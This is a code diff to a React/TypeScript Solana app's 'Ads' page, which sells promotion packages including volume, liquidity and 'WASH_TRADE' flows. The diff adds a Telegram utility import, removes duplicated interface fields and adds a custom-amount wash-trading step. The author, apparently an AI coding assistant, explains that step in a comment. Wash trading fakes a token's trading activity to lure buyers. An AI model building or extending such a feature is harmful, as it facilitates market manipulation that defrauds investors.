@@ -12,6 +12,7 @@ import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Tr
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { toast } from 'sonner';
+import { sendTelegramMessage } from '@/utils/telegram';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
@@ -61,8 +62,6 @@ interface DexPair {
   volume: {
     h24: number;
     h6: number;
-    h1: number;
-    m5: number;
     h1: number;
     m5: number;
   };
@@ -150,7 +149,7 @@ const Ads = () => {
   const [flowType, setFlowType] = useState<'ADS' | 'PRESS' | 'VOLUME' | 'LIQUIDITY' | 'WASH_TRADE'>('ADS');
   const [showPressReleasePreview, setShowPressReleasePreview] = useState(false);
   const [customText, setCustomText] = useState('');
-  const [flowStep, setFlowStep] = useState<'INPUT' | 'PACKAGES' | 'PAYMENT' | 'CUSTOM_TEXT' | 'LIQUIDITY_CONFIG'>('INPUT');
+  const [flowStep, setFlowStep] = useState<'INPUT' | 'PACKAGES' | 'PAYMENT' | 'CUSTOM_TEXT' | 'LIQUIDITY_CONFIG' | 'WASH_CUSTOM'>('INPUT');
   const [contractAddress, setContractAddress] = useState('');
   const [fetchedToken, setFetchedToken] = useState<DexPair | null>(null);
   const [fetchError, setFetchError] = useState('');
@@ -483,7 +482,7 @@ const Ads = () => {
         // The user description says "customized button with where the users set the amount". 
         // This implies the input is IN the button or replaces the view.
         // I will implement a WASH_CUSTOM step.
-        setFlowStep('WASH_CUSTOM' as any); 
+        setFlowStep('WASH_CUSTOM');
         return;
     }
     
